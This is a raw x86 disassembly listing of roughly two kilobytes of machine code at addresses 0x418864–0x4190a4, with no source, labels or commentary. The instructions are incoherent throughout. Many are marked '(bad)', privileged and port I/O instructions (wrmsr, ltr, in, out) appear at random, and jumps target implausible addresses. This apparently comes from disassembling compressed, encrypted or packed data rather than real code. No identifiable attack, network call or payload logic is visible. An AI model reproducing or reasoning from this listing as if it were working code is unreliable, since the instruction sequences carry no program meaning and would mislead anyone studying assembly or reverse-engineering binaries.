  418864:	inc    ebp
  418865:	xor    DWORD PTR [ebx+0x6c8bc89c],ecx
  41886b:	cld    
  41886c:	add    BYTE PTR [edi+0x556c16c0],dh
  418872:	add    BYTE PTR [ecx-0x5],dl
  418875:	add    eax,0x17200
  41887a:	sbb    al,0x85
  41887c:	dec    esp
  41887d:	je     0x4188b7
  41887f:	mov    esp,DWORD PTR [eax+ecx*8+0x20]
  418883:	add    BYTE PTR [ebx],bh
  418885:	(bad)  
  418886:	and    al,0x30
  418888:	jae    0x418826
  41888a:	mov    cl,cl
  41888c:	inc    DWORD PTR [esp]
  41888f:	push   ebp
  418890:	shr    esp,0x8
  418893:	in     al,dx
  418894:	push   esp
  418895:	add    DWORD PTR [eax],esp
  418897:	add    bl,cl
  418899:	inc    ebp
  41889a:	mov    bh,0x53
  41889c:	add    BYTE PTR [ebp-0x17],al
  41889f:	push   esi
  4188a0:	cmovne ecx,edx
  4188a3:	xor    BYTE PTR [esp+ebx*4+0x20],cl
  4188a7:	push   edi
  4188a8:	pop    ss
  4188a9:	xor    ecx,ebx
  4188ab:	pushf  
  4188ac:	add    BYTE PTR [ecx+0x452bf800],cl
  4188b2:	rcr    ecx,0x5
  4188b5:	inc    ebp
  4188b6:	add    esp,ebx
  4188b8:	add    BYTE PTR [ebp-0x40],al
  4188bb:	out    0x6c,eax
  4188bd:	inc    ebp
  4188be:	inc    eax
  4188bf:	sub    eax,0x450547c1
  4188c4:	dec    esp
  4188c5:	and    BYTE PTR cs:[ebp-0x27],al
  4188c9:	jo     0x4188f4
  4188cb:	leave  
  4188cc:	add    BYTE PTR [esi+0xc000c0],bh
  4188d2:	lea    eax,[esp-0x40]
  4188d6:	ret    
  4188d7:	mov    dh,0x8b
  4188d9:	xor    edx,DWORD PTR [ecx+0x3]
  4188dc:	mov    al,BYTE PTR [ecx+0x1]
  4188df:	sbb    BYTE PTR [eax],al
  4188e1:	stc    
  4188e2:	mov    esi,DWORD PTR [edx+0x8]
  4188e5:	(bad)  
  4188e6:	ss mov eax,0xb98ac631
  4188ec:	add    esi,eax
  4188ee:	add    BYTE PTR [edx-0x444d39f7],bh
  4188f4:	add    esi,eax
  4188f6:	add    BYTE PTR [esi+ecx*1+0x1bd82c6],bh
  4188fd:	mov    BYTE PTR [eax],0xbe
  418900:	or     BYTE PTR [ebx],dh
  418902:	dec    ecx
  418903:	lea    eax,[ebx]
  418905:	or     eax,0x18fc0fc7
  41890a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41890b:	(bad)  
  41890d:	fiadd  WORD PTR [ebp-0x78]
  418910:	jae    0xed76905f
  418916:	or     BYTE PTR [ebp+0x7],al
  418919:	in     eax,dx
  41891a:	pushf  
  41891b:	inc    ebp
  41891c:	xor    bl,al
  41891e:	pop    esi
  41891f:	inc    ebp
  418920:	shl    esp,0xc
  418923:	inc    ebp
  418924:	sub    cl,0x1
  418927:	inc    ebp
  418928:	add    bh,bl
  41892a:	add    BYTE PTR [ebp-0x7b],al
  41892d:	loopne 0x418927
  41892f:	inc    ebp
  418930:	ret    0xe7
  418933:	inc    ebp
  418934:	mov    esi,DWORD PTR [eax-0x7f]
  418937:	leave  
  418938:	and    al,0x44
  41893a:	add    BYTE PTR [eax+0x331cb68b],dh
  418940:	mov    DWORD PTR [ebx],eax
  418942:	sbb    al,0x41
  418944:	(bad)  
  418945:	sbb    al,ah
  418947:	stc    
  418948:	test   DWORD PTR [edx-0x8],esi
  41894b:	lea    edi,[edi-0x7007a98]
  418951:	mov    DWORD PTR [ebp-0x2c],edi
  418954:	(bad)  
  418955:	dec    ebp
  418956:	sar    BYTE PTR [eax+0x71c1fcc6],0xc6
  41895d:	add    edx,eax
  41895f:	(bad)  
  418960:	(bad)  
  418961:	inc    ebx
  418963:	jmp    FWORD PTR [edx-0x38]
  418966:	(bad)  
  418967:	or     al,ah
  418969:	jge    0x418931
  41896b:	mov    ebp,0x5a8533e4
  418971:	clc    
  418972:	leave  
  418973:	inc    ebp
  418974:	add    BYTE PTR [ebx+0xd8c8d],cl
  41897a:	rdpmc  
  41897c:	sbb    BYTE PTR [edi+0x7de08da],bh
  418982:	mov    BYTE PTR [ebx+eax*4-0x12c6f9ce],bl
  418989:	cmovne edx,ebx
  41898c:	jmp    0x41898e
  41898e:	inc    ebp
  41898f:	mov    ebp,ebp
  418991:	sbb    al,0x45
  418993:	mov    ebx,ebx
  418995:	add    DWORD PTR [ebp+0x0],eax
  418998:	out    dx,al
  418999:	add    DWORD PTR [ebp+0x4d],eax
  41899c:	sub    eax,0x2e80458b
  4189a1:	add    BYTE PTR [ebp-0x77],al
  4189a4:	jo     0x418a10
  4189a6:	leave  
  4189a7:	mov    DWORD PTR [esp+ecx*8-0x48],0x33e9b6d8
  4189af:	inc    ebp
  4189b0:	add    ebx,edi
  4189b2:	inc    ecx
  4189b3:	out    0x18,eax
  4189b5:	(bad)  
  4189b6:	stc    
  4189b7:	int3   
  4189b8:	jb     0x418944
  4189ba:	(bad)  
  4189bb:	xor    dh,BYTE PTR [eax-0x4ec83980]
  4189c1:	or     dh,al
  4189c3:	dec    esi
  4189c4:	mov    dl,0xf3
  4189c6:	mov    BYTE PTR [ebp-0x4d],0x89
  4189ca:	(bad)  
  4189cb:	loopne 0x418981
  4189cd:	inc    esi
  4189cf:	lea    esi,[ebp-0x49003924]
  4189d5:	push   eax
  4189d6:	mov    BYTE PTR [ebp-0x49],0x33
  4189da:	xor    eax,DWORD PTR [ebx]
  4189dc:	lea    edx,[eax+0xd]
  4189df:	inc    ebp
  4189e0:	jae    0x8c1beffe
  4189e6:	ficomp WORD PTR [eax+ecx*4]
  4189e9:	add    BYTE PTR [ebx-0x12fff7ff],0x85
  4189f0:	test   esi,edi
  4189f2:	(bad)  
  4189f3:	(bad)  
  4189f4:	inc    DWORD PTR [eax]
  4189f6:	inc    ebp
  4189f7:	add    BYTE PTR [ebx-0x10aa2bd0],cl
  4189fd:	test   DWORD PTR [ebx],edx
  4189ff:	jne    0x41898a
  418a01:	or     DWORD PTR [ebx-0xed9771],0x75703b8c
  418a0b:	jmp    0x1258a99
  418a10:	inc    ebp
  418a11:	jne    0x4189f5
  418a13:	mov    DWORD PTR [eax+eiz*8+0x331cff8b],ebx
  418a1a:	mov    BYTE PTR [ebp+0x45009c01],cl
  418a20:	shl    BYTE PTR [eax],0x55
  418a23:	push   cx
  418a25:	mov    bx,0x7245
  418a29:	gs add bh,al
  418a2c:	add    DWORD PTR [ebp+eax*4+0xd801df],ebx
  418a33:	inc    ebp
  418a34:	dec    ebp
  418a35:	into   
  418a36:	mov    esp,ebx
  418a38:	jl     0x418a01
  418a3a:	add    BYTE PTR [ecx+ecx*4+0x1ce48bdb],ah
  418a41:	inc    ebp
  418a42:	mov    edi,ebx
  418a44:	add    ebp,esp
  418a46:	add    BYTE PTR [esi+0x1],ah
  418a49:	inc    ebp
  418a4a:	or     BYTE PTR [edi],bh
  418a4c:	inc    ebp
  418a4d:	(bad)  
  418a4e:	in     eax,dx
  418a4f:	fsubr  st(4),st
  418a51:	inc    edi
  418a53:	add    dl,al
  418a55:	add    al,ah
  418a57:	call   0x86a2cc
  418a5c:	pop    esi
  418a5d:	test   DWORD PTR [eax],ecx
  418a5f:	dec    dl
  418a61:	(bad)  
  418a62:	jmp    0x414012ec
  418a67:	push   DWORD PTR [ebp-0x75]
  418a6a:	(bad)  
  418a6b:	loopne 0x418a39
  418a6d:	mov    DWORD PTR [ebp-0x74013d],0xfec0851c
  418a77:	push   eax
  418a78:	inc    DWORD PTR [ebp-0x75]
  418a7b:	mov    esp,eax
  418a7d:	cwde   
  418a7e:	mov    DWORD PTR [eax],0xff8bffc3
  418a84:	sbb    al,0x8
  418a86:	ror    BYTE PTR [ebp+0x50],0x51
  418a8a:	inc    ebp
  418a8b:	ror    BYTE PTR [ebx+0x65987d],1
  418a91:	test   edi,eax
  418a93:	add    al,0xdc
  418a95:	add    bh,bh
  418a97:	push   0x1
  418a99:	add    BYTE PTR [eax],al
  418a9b:	mov    edi,edi
  418a9d:	inc    WORD PTR [ebp+0x8]
  418aa1:	add    eax,0xd
  418aa4:	(bad)  
  418aa6:	xor    eax,0x782ec89
  418aab:	push   ecx
  418aac:	cli    
  418aad:	popw   es
  418aaf:	push   ebp
  418ab0:	xchg   BYTE PTR [ebx-0x76740800],al
  418ab6:	sbb    al,0x86
  418ab8:	test   DWORD PTR [ecx-0x2],edx
  418abb:	call   WORD PTR [ebp-0x40]
  418abf:	adc    DWORD PTR [ebp-0x5],0xffffffc7
  418ac3:	mov    eax,ebx
  418ac5:	mov    dh,BYTE PTR ds:0xc7666851
  418acb:	push   ebp
  418acc:	fsub   QWORD PTR [esi+0x0]
  418acf:	dec    ebp
  418ad0:	inc    ebp
  418ad1:	mov    edx,0xec4ec0
  418ad6:	(bad)  
  418ad7:	retf   0x89a0
  418ada:	fist   DWORD PTR [eax+0x454ae1]
  418ae0:	jmp    0xa8b5:0xc7663e8b
  418ae7:	jmp    edx
  418ae9:	(bad)  
  418aea:	in     eax,dx
  418aeb:	lock (bad) 
  418aed:	mov    DWORD PTR [esi+ebp*2-0x727a0090],ebp
  418af4:	(bad)  
  418af5:	xor    eax,0x700089ff
  418afa:	add    bh,bh
  418afc:	stos   DWORD PTR es:[edi],eax
  418afd:	data16 add BYTE PTR [ebp-0x1b0077],al
  418b04:	inc    DWORD PTR [ecx-0x73]
  418b07:	data16 fadd QWORD PTR [ebp-0xaf0001]
  418b0e:	inc    ebp
  418b0f:	shl    BYTE PTR [ebx],0x66
  418b12:	add    eax,DWORD PTR [ebp-0xba00b0]
  418b18:	add    DWORD PTR [ecx+0x44],0x66
  418b1c:	mov    eax,DWORD PTR [ebp-0x7f00e4]
  418b22:	add    DWORD PTR [ecx-0xcf8600],ecx
  418b28:	push   ebp
  418b29:	lea    dx,[ebp-0x28]
  418b30:	add    BYTE PTR [ebp-0x25],0xf
  418b34:	jge    0xff428a3b
  418b3a:	mov    ecx,0xc34fc7
  418b3f:	rol    ecx,0x89
  418b42:	mov    DWORD PTR [eax+eax*4-0x1],ebp
  418b46:	ror    BYTE PTR [ebx-0x48990775],0x55
  418b4d:	or     BYTE PTR [ebp-0x763c0a39],0xc1
  418b54:	test   BYTE PTR [ecx-0x3f997f3e],cl
  418b5a:	push   ebp
  418b5b:	mov    DWORD PTR [ebp-0x76761480],ecx
  418b61:	or     BYTE PTR [eax+0x6600c265],0x45
  418b68:	push   ebp
  418b69:	xor    DWORD PTR [ebp-0x76381e64],ecx
  418b6f:	aam    0x8c
  418b71:	test   DWORD PTR [ecx-0x3dba7108],ecx
  418b77:	cmp    eax,0xc78b9c00
  418b7c:	data16 hlt 
  418b7e:	dec    ebp
  418b7f:	test   DWORD PTR [ecx+0x454ff8],edi
  418b85:	xor    ecx,esi
  418b87:	lahf   
  418b88:	mov    DWORD PTR [ebx-0x7f00e394],ecx
  418b8e:	mov    eax,DWORD PTR [ecx]
  418b90:	data16 add BYTE PTR [ebp-0x7400bb],dh
  418b97:	sbb    al,0x71
  418b99:	dec    ebp
  418b9a:	mov    si,WORD PTR [ebp-0xff0074]
  418ba1:	mov    ecx,DWORD PTR [ecx-0x6f8d75]
  418ba7:	add    BYTE PTR [ebp-0x760fd477],cl
  418bad:	jne    0x418c23
  418baf:	test   edi,edi
  418bb1:	jne    0x418b36
  418bb3:	(bad)  
  418bb4:	sti    
  418bb5:	sbb    BYTE PTR [ecx-0x1789ab],cl
  418bbb:	cld    
  418bbc:	(bad)  
  418bbd:	jmp    DWORD PTR [ecx]
  418bbf:	inc    ebp
  418bc0:	mov    DWORD PTR [ebx+0x3ff8b78],ecx
  418bc6:	data16 cmp al,0x8d
  418bc9:	push   cs
  418bca:	inc    DWORD PTR [ebp-0x1]
  418bcd:	test   DWORD PTR [ecx-0x838c],ecx
  418bd3:	sbb    al,0x8b
  418bd5:	lock clc 
  418bd7:	push   DWORD PTR [edi-0xe39375]
  418bdd:	xor    BYTE PTR [ebx],0x1
  418be0:	add    eax,DWORD PTR [eax]
  418be2:	xor    eax,DWORD PTR [eax]
  418be4:	mov    WORD PTR [ebp-0xba003d],0x4575
  418bed:	mov    ecx,DWORD PTR [edi]
  418bef:	sbb    al,0x4d
  418bf1:	mov    DWORD PTR [ebx],esi
  418bf3:	add    DWORD PTR [ebx],eax
  418bf5:	add    BYTE PTR [ebx],dh
  418bf7:	xor    DWORD PTR [esi-0x80],esp
  418bfa:	inc    ebp
  418bfb:	add    DWORD PTR [ebx],esi
  418bfd:	add    BYTE PTR [esi+0x50],ah
  418c00:	inc    ebp
  418c01:	jmp    0x868e6c
  418c06:	add    DWORD PTR [eax+0xc70194],0xffffffec
  418c0d:	or     BYTE PTR [ebp+0x4501f845],dh
  418c13:	jmp    0xdd8f09
  418c18:	(bad)  
  418c19:	push   cs
  418c1a:	in     al,0xc9
  418c1c:	test   DWORD PTR [ebp+0x4502f8],eax
  418c22:	xor    ecx,DWORD PTR [ebp-0x64]
  418c25:	mov    eax,edi
  418c27:	mov    esp,esp
  418c29:	push   eax
  418c2a:	add    eax,0x45fff885
  418c2f:	dec    DWORD PTR [ebx+0x339445]
  418c35:	add    ecx,DWORD PTR [ecx+0x452ce889]
  418c3b:	dec    DWORD PTR [ebx-0x4e0be375]
  418c41:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418c42:	add    edi,edi
  418c44:	add    bh,bh
  418c46:	push   cs
  418c47:	xor    eax,DWORD PTR [eax+0x890103]
  418c4d:	xor    BYTE PTR [ebp-0x1],al
  418c50:	mov    DWORD PTR [ebp-0x36df38],ecx
  418c56:	push   cs
  418c57:	push   eax
  418c58:	jne    0x418c9f
  418c5a:	mov    esi,DWORD PTR [ebx]
  418c5c:	sbb    al,0x3
  418c5e:	jne    0x418cb0
  418c60:	inc    DWORD PTR [ebp-0x75]
  418c63:	add    eax,0x800f0
  418c68:	add    BYTE PTR [ebx-0x7f74e3bf],cl
  418c6e:	mov    DWORD PTR [ecx],eax
  418c70:	sbb    BYTE PTR [eax],al
  418c72:	leave  
  418c73:	test   DWORD PTR [edi-0x1],eax
  418c76:	jne    0x418c77
  418c78:	call   0xff42777d
  418c7d:	xor    BYTE PTR [ebp+0x4d],al
  418c80:	mov    edi,edi
  418c82:	enter  0x8,0x4d
  418c86:	mov    ecx,DWORD PTR [ebx-0x17fc74cd]
  418c8c:	mov    eax,DWORD PTR [eax]
  418c8e:	sbb    al,0x1
  418c90:	sbb    DWORD PTR [ebp+0x4d],eax
  418c93:	mov    DWORD PTR [ebx+0x18cc8b],ecx
  418c99:	inc    eax
  418c9a:	dec    DWORD PTR [ecx-0x27d775]
  418ca0:	add    BYTE PTR [ebx-0x38d72b01],cl
  418ca6:	xchg   ecx,eax
  418ca7:	ret    
  418ca8:	add    BYTE PTR [ebp-0x830075],al
  418cae:	add    BYTE PTR [ebp-0x75],al
  418cb1:	mov    DWORD PTR [ebp+0x8ff0430],ecx
  418cb7:	lea    edi,[edi+0x20]
  418cba:	add    bh,bh
  418cbc:	mov    edx,DWORD PTR [eax-0x7b]
  418cbf:	inc    ebp
  418cc0:	rdpmc  
  418cc2:	jne    0x418cc7
  418cc4:	add    BYTE PTR [eax-0x75],dl
  418cc7:	inc    ebp
  418cc8:	call   0x404195d2
  418ccd:	add    BYTE PTR [ecx-0xe3d775],cl
  418cd3:	or     BYTE PTR [ebx-0x38ff13ff],0x85
  418cda:	ret    
  418cdb:	inc    DWORD PTR [ebp-0xff0001]
  418ce1:	add    BYTE PTR [ebp-0x4b],al
  418ce4:	cmp    edi,0x24
  418ce7:	(bad)  
  418ce8:	push   DWORD PTR [eax]
  418cea:	add    BYTE PTR [ebp-0x39],dl
  418ced:	test   ebx,eax
  418cef:	je     0x418c76
  418cf1:	mov    edi,edi
  418cf3:	sbb    bh,bh
  418cf5:	test   DWORD PTR gs:[eax],eax
  418cf8:	(bad)  
  418cf9:	js     0x418cfa
  418cfb:	add    BYTE PTR [ebx-0x38b21fdd],cl
  418d01:	sub    eax,ebx
  418d03:	mov    ecx,DWORD PTR [ebx-0x5513e377]
  418d09:	add    eax,DWORD PTR [eax]
  418d0b:	dec    ebp
  418d0c:	push   eax
  418d0d:	mov    al,BYTE PTR [ebp+0x1]
  418d10:	mov    eax,DWORD PTR [ebp-0x68]
  418d13:	mov    eax,DWORD PTR [eax]
  418d15:	cld    
  418d16:	(bad)  
  418d17:	or     BYTE PTR [eax],ah
  418d19:	dec    ebp
  418d1a:	inc    DWORD PTR [eax+0x4]
  418d1d:	push   ecx
  418d1e:	add    BYTE PTR [edx-0x1],dh
  418d21:	mov    ecx,DWORD PTR [ecx+0x55cef83c]
  418d27:	or     DWORD PTR [ebx-0xfff3800],0x8b5545d6
  418d31:	add    ecx,DWORD PTR [ecx-0xf037477]
  418d37:	push   ecx
  418d38:	xor    BYTE PTR [ebx],al
  418d3a:	inc    ebp
  418d3b:	mov    DWORD PTR [ebx-0x7aaaafe8],ecx
  418d41:	(bad)  
  418d42:	push   eax
  418d44:	inc    DWORD PTR [eax]
  418d46:	inc    ebp
  418d47:	add    BYTE PTR [ebx],dh
  418d49:	add    BYTE PTR [ebx],0x0
  418d4c:	mov    DWORD PTR [ebx-0x150007d4],eax
  418d52:	lea    edx,[ebp-0x6c]
  418d55:	je     0x418cdc
  418d57:	(bad)  
  418d58:	dec    DWORD PTR [eax]
  418d5a:	call   DWORD PTR [ebp-0x7b]
  418d5d:	mov    edi,edi
  418d5f:	hlt    
  418d60:	call   DWORD PTR [ebp-0x75]
  418d63:	mov    esp,eax
  418d65:	cwde   
  418d66:	(bad)  
  418d67:	mov    bh,0xc3
  418d69:	mov    DWORD PTR [ebx-0x1100e39c],ecx
  418d6f:	add    DWORD PTR [eax],0x450050ff
  418d75:	mov    DWORD PTR [ebx+0x9598c8],ecx
  418d7b:	inc    edi
  418d7d:	jmp    DWORD PTR [eax]
  418d7f:	jmp    0xcd00:0x640481ff
  418d86:	mov    DWORD PTR [ebx],esi
  418d88:	and    al,0x81
  418d8a:	push   DWORD PTR [edx]
  418d8c:	call   FWORD PTR [edi+edi*8-0x3f74f78b]
  418d93:	add    esi,DWORD PTR [eax]
  418d95:	enter  0x3c45,0x83
  418d99:	add    ah,bh
  418d9b:	adc    DWORD PTR [ebx+0x768b5055],eax
  418da1:	add    ecx,DWORD PTR [ebx-0x31ba07cf]
  418da7:	mov    esi,eax
  418da9:	xor    BYTE PTR [ebp+0x45],cl
  418dac:	jmp    0x418d39
  418dae:	mov    ebx,DWORD PTR [eax]
  418db0:	in     al,dx
  418db1:	inc    ebp
  418db2:	or     al,0x2
  418db4:	dec    DWORD PTR [ebp-0x4]
  418db7:	jne    0x418e0e
  418db9:	mov    ecx,DWORD PTR [eax+0x18558be8]
  418dbf:	mov    edi,DWORD PTR [ebx]
  418dc1:	lock push eax
  418dc3:	xchg   ecx,eax
  418dc4:	jmp    0x341dbc9
  418dc9:	adc    al,0x8b
  418dcb:	inc    ebp
  418dcc:	mov    al,ds:0x8b04008b
  418dd1:	push   ebp
  418dd2:	sub    ecx,DWORD PTR [ecx-0x2d391308]
  418dd8:	push   ebp
  418dd9:	test   DWORD PTR [ebx-0x2900d701],ecx
  418ddf:	inc    ebp
  418de0:	dec    ebp
  418de1:	mov    DWORD PTR [ecx+0x45ffe424],ecx
  418de7:	mov    DWORD PTR [eax],0xe9ff0020
  418ded:	add    al,0x0
  418def:	add    BYTE PTR [eax],al
  418df1:	mov    eax,edx
  418df3:	push   eax
  418df4:	rol    DWORD PTR [ebp-0xb0077],1
  418dfa:	bound  eax,QWORD PTR [ebp+0x50]
  418dfd:	xor    ecx,DWORD PTR [ecx+0x55899803]
  418e03:	sub    al,0x89
  418e05:	push   esp
  418e07:	lea    edx,[ebp-0x6c]
  418e0a:	jne    0xffd78d22
  418e10:	inc    DWORD PTR [ebp-0x1d0001]
  418e16:	jnp    0xc7976e1c
  418e1c:	mov    eax,ebx
  418e1e:	fs mov edi,edi
  418e21:	sbb    al,0xc1
  418e23:	out    dx,al
  418e24:	or     al,0x0
  418e26:	ret    0x8d50
  418e29:	inc    ebp
  418e2a:	dec    DWORD PTR [ebx+0xfa98d7]
  418e30:	test   edi,edi
  418e32:	clc    
  418e33:	call   FWORD PTR [edi]
  418e35:	or     BYTE PTR [eax],cl
  418e37:	inc    ebp
  418e38:	dec    ebp
  418e39:	inc    DWORD PTR [ebx+0x74803114]
  418e3f:	add    DWORD PTR [ebx+0x45fc00],ecx
  418e45:	call   DWORD PTR [eax+edx*1]
  418e48:	add    ecx,DWORD PTR [ebp-0x38]
  418e4b:	push   esi
  418e4c:	adc    al,0x8
  418e4e:	mov    edx,DWORD PTR [ebp-0x14]
  418e51:	mov    ecx,DWORD PTR [ebp-0x4]
  418e54:	add    DWORD PTR [ebp-0x68],0xffffff8d
  418e58:	inc    DWORD PTR [esp+esi*8]
  418e5b:	inc    ebp
  418e5c:	stos   BYTE PTR es:[edi],al
  418e5d:	mov    edx,DWORD PTR [ebp+0x1c]
  418e60:	add    DWORD PTR [ebp-0x10],eax
  418e63:	mov    edx,DWORD PTR [ebp-0x70]
  418e66:	cmp    eax,DWORD PTR [eax]
  418e68:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418e69:	mov    eax,DWORD PTR [eax]
  418e6b:	sbb    al,0x73
  418e6d:	add    BYTE PTR [ebx],0x1
  418e70:	call   0x8971de75
  418e75:	xor    eax,ebp
  418e77:	pop    ds
  418e78:	inc    ebp
  418e79:	xor    al,BYTE PTR [ebp+0x6f760f3a]
  418e7f:	(bad)  
  418e80:	push   DWORD PTR [edi]
  418e82:	mov    ecx,DWORD PTR [ebx+0x398503f8]
  418e88:	push   DWORD PTR [ebx-0x1]
  418e8b:	mov    eax,DWORD PTR [ebp-0x740075]
  418e91:	sub    eax,DWORD PTR [eax]
  418e93:	add    eax,DWORD PTR [eax]
  418e95:	mov    DWORD PTR [ecx+0x5f],eax
  418e98:	mov    DWORD PTR [ebx+0x28],ebx
  418e9b:	ret    0xff
  418e9e:	mov    ecx,DWORD PTR [ebx+0x1cc783d4]
  418ea4:	ret    
  418ea5:	mov    eax,DWORD PTR [ebp-0x6f0075]
  418eab:	add    BYTE PTR [ebp-0x7d],al
  418eae:	mov    DWORD PTR [eax],eax
  418eb0:	xor    BYTE PTR [edi+edi*8+0x20008d01],al
  418eb7:	sar    bh,cl
  418eb9:	test   BYTE PTR [eax+0x1],dl
  418ebc:	inc    ebp
  418ebd:	add    BYTE PTR [ebx],dh
  418ebf:	test   BYTE PTR [ebx],0x84
  418ec2:	push   eax
  418ec3:	add    BYTE PTR [ebp+0x0],al
  418ec6:	add    eax,0x86
  418ecb:	add    BYTE PTR [ebx-0x7f7be340],cl
  418ed1:	add    BYTE PTR [ecx],al
  418ed3:	add    BYTE PTR [eax],al
  418ed5:	mov    esi,0x550030
  418eda:	mov    ecx,DWORD PTR [edi]
  418edc:	sbb    al,0xda
  418ede:	jne    0x418ee0
  418ee0:	mov    edi,DWORD PTR [ecx]
  418ee2:	xor    BYTE PTR [eax+eax*1],0x84
  418ee6:	add    eax,DWORD PTR [eax]
  418ee8:	cld    
  418ee9:	add    BYTE PTR [ebp-0x4f],dh
  418eec:	mov    eax,DWORD PTR [ecx]
  418eee:	cld    
  418eef:	add    BYTE PTR [ecx-0x1bff009b],cl
  418ef5:	retf   0xe45
  418ef8:	add    eax,edx
  418efa:	sbb    al,0xb7
  418efc:	dec    ebp
  418efd:	or     al,0x89
  418eff:	dec    ebp
  418f00:	sbb    al,0xf
  418f02:	inc    ebp
  418f03:	dec    eax
  418f04:	mov    eax,DWORD PTR [ebx]
  418f06:	sbb    al,0xf
  418f08:	nop
  418f09:	scas   al,BYTE PTR es:[edi]
  418f0a:	add    DWORD PTR [eax],eax
  418f0c:	add    BYTE PTR [ebp-0x7674ebbb],cl
  418f12:	mov    eax,gs
  418f14:	add    bh,bh
  418f16:	mov    edi,edi
  418f18:	cmp    DWORD PTR [edi+0x72],edx
  418f1b:	xor    DWORD PTR [ebx-0x74ee7481],ecx
  418f21:	gs cmp al,0x0
  418f24:	je     0x418efc
  418f26:	push   eax
  418f27:	sar    BYTE PTR [eax],1
  418f29:	mov    bh,0x3e
  418f2b:	push   cs
  418f2c:	cmp    DWORD PTR [edi-0x4cff3f4],esi
  418f32:	add    DWORD PTR [ecx+0x12],ebp
  418f35:	dec    edx
  418f36:	(bad)  
  418f37:	mov    eax,edx
  418f39:	in     al,dx
  418f3a:	adc    DWORD PTR [ecx],esi
  418f3c:	pop    esi
  418f3d:	inc    ecx
  418f3e:	leave  
  418f3f:	or     DWORD PTR [eax],ebx
  418f41:	gs push ebp
  418f43:	add    ah,ch
  418f45:	into   
  418f46:	in     al,dx
  418f47:	enter  0xb756,0xf0
  418f4b:	push   cs
  418f4c:	xor    DWORD PTR [edi-0x4fff3ff],0x790f2b38
  418f56:	or     cl,BYTE PTR [ecx+0x7d85fc00]
  418f5c:	jnp    0x74421464
  418f62:	test   DWORD PTR [ebx+0x1cfae40f],ecx
  418f68:	add    BYTE PTR [edi],cl
  418f6a:	mov    edi,DWORD PTR [ecx-0x78]
  418f6d:	ltr    WORD PTR [ecx-0x7b]
  418f71:	dec    DWORD PTR [edi]
  418f73:	clc    
  418f74:	out    0x45,eax
  418f76:	add    BYTE PTR [eax],cl
  418f78:	cmp    ebx,0xffffff8c
  418f7b:	jge    0x418f7d
  418f7d:	jb     0x418f8f
  418f7f:	je     0x508fff
  418f85:	pop    edx
  418f86:	push   esi
  418f87:	mov    ecx,DWORD PTR [edi]
  418f89:	in     al,dx
  418f8a:	rol    DWORD PTR [ebp+0x0],1
  418f8d:	or     DWORD PTR [ebx+0xfb8c08],0x4d
  418f94:	cmp    DWORD PTR [ecx],0xfffffff0
  418f97:	hlt    
  418f98:	mov    esp,DWORD PTR [eax+0xf034d2b]
  418f9e:	(bad)  
  418fa0:	push   eax
  418fa1:	jns    0xb841741f
  418fa7:	lock push cs
  418fa9:	ror    edx,0x3
  418fac:	test   BYTE PTR [ecx+0x5500e800],cl
  418fb2:	dec    eax
  418fb3:	rcpps  xmm4,XMMWORD PTR [ecx+0x4d]
  418fb7:	(bad)  
  418fb8:	mov    esi,0x7f33ff5f
  418fbd:	inc    eax
  418fbe:	test   DWORD PTR [edx],eax
  418fc0:	je     0x418f82
  418fc2:	mov    ecx,ecx
  418fc4:	adc    DWORD PTR [ebp-0xc],0xffffffec
  418fc8:	and    eax,DWORD PTR [eax+0xf0103]
  418fce:	jp     0x418fbc
  418fd0:	rcpps  xmm3,XMMWORD PTR [edx-0x25]
  418fd4:	add    edx,DWORD PTR [edi+0x74]
  418fd7:	sbb    BYTE PTR [ebp+0x4d001484],cl
  418fdd:	add    BYTE PTR [ebp-0x74c48bbb],al
  418fe3:	je     0x418f68
  418fe5:	cmp    eax,edi
  418fe7:	js     0x41900c
  418fe9:	add    eax,0xeb0fc003
  418fee:	jns    0x418f7b
  418ff0:	vmread DWORD PTR [ecx+0x45],ebx
  418ff4:	add    ecx,DWORD PTR [ebx+0x508d1c74]
  418ffa:	adc    al,0x8b
  418ffc:	jge    0x419012
  418ffe:	mov    edi,DWORD PTR [eax-0x4]
  419001:	add    edi,DWORD PTR [edi]
  419003:	or     bh,bh
  419005:	push   ebp
  419006:	push   es
  419007:	mov    DWORD PTR [ebp-0x4],ebx
  41900a:	add    edi,esi
  41900c:	pop    es
  41900d:	add    esi,DWORD PTR [edi-0x48ccf183]
  419013:	mov    DWORD PTR [esp+esi*8],ecx
  419016:	inc    ebp
  419017:	pop    ebp
  419018:	xor    DWORD PTR [esi-0x4],0x3b
  41901c:	add    edx,DWORD PTR [ecx+edi*1]
  41901f:	push   es
  419020:	clc    
  419021:	mov    bh,0xdb
  419023:	jp     0x418fdc
  419025:	add    cl,BYTE PTR [esi]
  419027:	div    DWORD PTR [edi+0x4d8b0c1c]
  41902d:	test   edi,edi
  41902f:	je     0x419025
  419031:	mov    eax,ecx
  419033:	or     BYTE PTR [ebx],al
  419035:	dec    BYTE PTR [ecx+0x7d3bec7d]
  41903b:	jbe    0x4190af
  41903d:	mov    ecx,DWORD PTR [ebx-0x488017f4]
  419043:	add    ecx,DWORD PTR [esi]
  419045:	cmp    DWORD PTR [edi+0x45fe0cf8],esi
  41904b:	add    eax,DWORD PTR [ebx-0x287af783]
  419051:	je     0x4190a0
  419053:	mov    DWORD PTR [ecx],edi
  419055:	mov    esi,eax
  419057:	hlt    
  419058:	or     BYTE PTR [ecx+0x7dfff4ff],0x5b
  41905f:	jb     0x419021
  419061:	jmp    0x41904e
  419063:	xor    esi,DWORD PTR [ebx]
  419065:	pop    edi
  419066:	pop    esi
  419067:	pop    ebx
  419068:	ret    
  419069:	ret    0x8b
  41906c:	mov    ecx,DWORD PTR [ebx+0x2c008390]
  419072:	xor    DWORD PTR [ecx],0xc
  419075:	pushf  
  419076:	xor    ecx,DWORD PTR [ecx+0x4539fc56]
  41907c:	wrmsr  
  41907e:	test   DWORD PTR [eax+eax*1+0xcfc8b8b],ebx
  419085:	dec    ebp
  419086:	ret    
  419087:	mov    edi,DWORD PTR [esi-0x4]
  41908a:	pop    eax
  41908b:	dec    ebp
  41908c:	jne    0x419019
  41908e:	xor    edi,esp
  419090:	inc    eax
  419091:	dec    ebp
  419092:	jbe    0x4190e7
  419094:	inc    eax
  419095:	pop    ebp
  419096:	add    edx,DWORD PTR [esi+0x8]
  419099:	push   ebp
  41909a:	dec    eax
  41909b:	push   ecx
  41909c:	mov    eax,edi
  41909e:	and    al,0xf0
  4190a0:	jo     0x41908d
  4190a2:	mov    eax,DWORD PTR [ebx]
  4190a4:	sbb    BYTE PTR [ebp+0x4d],cl
